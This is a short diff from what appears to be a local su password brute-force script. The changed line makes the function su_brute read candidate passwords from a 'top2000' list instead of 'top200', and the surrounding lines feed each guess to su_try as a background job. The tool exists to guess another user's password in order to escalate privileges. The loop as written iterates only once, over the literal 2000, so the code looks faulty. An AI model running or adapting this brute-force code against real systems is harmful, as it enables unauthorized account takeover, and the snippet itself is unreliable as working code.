@@ -58,7 +58,7 @@ su_brute()
 
     for i_num in 2000; 
         do
-        TEMP_PASSWD=$(echo $top200 | cut -d ' ' -f $i_num)
+        TEMP_PASSWD=$(echo $top2000 | cut -d ' ' -f $i_num)
         echo "$TEMP_PASSWD"
         su_try "$SU_USER" "$TEMP_PASSWD" &
         
